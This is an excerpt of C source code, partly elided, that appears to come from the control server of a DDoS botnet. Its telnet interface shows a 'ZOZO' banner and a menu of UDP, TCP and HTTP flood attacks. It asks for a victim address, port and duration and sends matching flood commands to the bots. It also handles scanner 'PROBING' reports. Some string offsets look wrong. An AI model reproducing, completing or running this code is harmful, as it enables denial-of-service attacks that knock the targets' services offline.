                                ...
                                while (1)
                                {
                                        ...
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
						                        ...
						                        if(strstr(buf, "PROBING") == buf) {
						                            	char *line = strstr(buf, "PROBING ") + 7;
						                            	scannerreport = 1;
														//TODO:
						                            	continue;
						                            	}
						                        if(strstr(buf, "REMOVING PROBE") == buf) {
						                            	char *line = strstr(buf, "REMOVING PROBE ") + 7;
						                            	scannerreport = 0;
														//TODO:
						                            	continue;
						                            	}
...
void *telnetWorker(void *sock)
{
	...
	if(send(thefd, "\x1b[36m+          WELCOME TO THE ZOZO         +\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
	if(send(thefd, "\x1b[36m+        In Demons We Must Trust       +\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
	if(send(thefd, "\x1b[36m++++++++++++++++++++++++++++++++++++++++\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
	if(send(thefd, "\x1b[36mInputs:\r\n", 15, MSG_NOSIGNAL) == -1) goto end;
	if(send(thefd, "\x1b[36m1: UDP\r\n", 14, MSG_NOSIGNAL) == -1) goto end;
	if(send(thefd, "\x1b[36m2: TCP\r\n", 14, MSG_NOSIGNAL) == -1) goto end;
	if(send(thefd, "\x1b[36m3: HTTP\r\n", 15, MSG_NOSIGNAL) == -1) goto end;
	while(1)
	{
	  ...
	  break;
	    ...
	    if(strstr(buf, "1")) 
        {
		  victim = raw_input("Victim: ", x, sizeof x);
		  port = raw_input("Port: ", x, sizeof x);
		  time = raw_input("Time: ", x, sizeof x);
		  sprintf(main, "!* UDP %s %s %s 32 0 10", victim, port, time);
		  if(send(thefd, main, strlen(main), MSG_NOSIGNAL) == -1) goto end;
		  continue;
	    }
	    if(strstr(buf, "2")) 
        {
		  ...
		  port = raw_input("Port: ", x, sizeof x);
		  time = raw_input("Time: ", x, sizeof x);
		  sprintf(main, "!* TCP %s %s %s 32 all 0 10", victim, port, time);
		  if(send(thefd, main, strlen(main), MSG_NOSIGNAL) == -1) goto end;
		  continue;
	    }
	    if(strstr(buf, "3")) 
        {	
		  victim = raw_input("Victim: ", x, sizeof x);
		  time = raw_input("Time: ", x, sizeof x);
		  sprintf(main, "!* HTTP %s %s", victim, time);
		  if(send(thefd, main, strlen(main), MSG_NOSIGNAL) == -1) goto end;
		  continue;
	    }
                trim(buf);
